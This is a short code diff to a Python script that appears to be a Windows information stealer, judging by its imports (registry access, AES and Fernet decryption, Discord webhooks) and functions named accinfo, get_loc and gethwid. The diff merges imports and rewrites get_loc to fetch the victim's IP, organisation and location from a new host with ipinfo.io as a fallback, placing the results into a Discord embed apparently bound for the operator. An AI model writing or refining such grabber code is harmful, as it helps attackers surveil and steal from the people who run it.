@@ -1,9 +1,4 @@
-import base64
-import difflib
-import json
-import os
-import sys
-import winreg
+import base64, difflib, json, os, sys, winreg, psutil, requests, winshell
 from base64 import b64decode
 from json import load, loads
 from platform import platform
@@ -16,9 +11,6 @@ from time import localtime, strftime
 from urllib.request import urlopen
 from zipfile import ZipFile
 
-import psutil
-import requests
-import winshell
 from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
 from discord import Embed, File, RequestsWebhookAdapter, Webhook
@@ -89,7 +81,7 @@ def accinfo():
 def get_loc():
     ip = org = loc = city = country = region = googlemap = "None"
     try:
-        url = 'http://ipinfo.io/json'
+        url = 'https://utilities.tk/network/info'
         response = urlopen(url)
         data = load(response)
         ip = data['ip']
@@ -102,7 +94,21 @@ def get_loc():
         
         embed.add_field(name="📍  LOC INFO", value=f"IP: {ip}\n\nORG: {org}\n\nLocation: [{loc}]({googlemap})\n\nCity: {city}\n\nRegion: {region}\n\nCountry: {country}") 
     except:
-        pass
+        try:
+            url = 'http://ipinfo.io/json'
+            response = urlopen(url)
+            data = load(response)
+            ip = data['ip']
+            org = data['org']
+            loc = data['loc']
+            city = data['city']
+            country = data['country']
+            region = data['region']
+            googlemap = "https://www.google.com/maps/search/google+map++" + loc
+
+            embed.add_field(name="📍  LOC INFO", value=f"IP: {ip}\n\nORG: {org}\n\nLocation: [{loc}]({googlemap})\n\nCity: {city}\n\nRegion: {region}\n\nCountry: {country}") 
+        except:
+            pass
 
 def get_more():
     def gethwid():
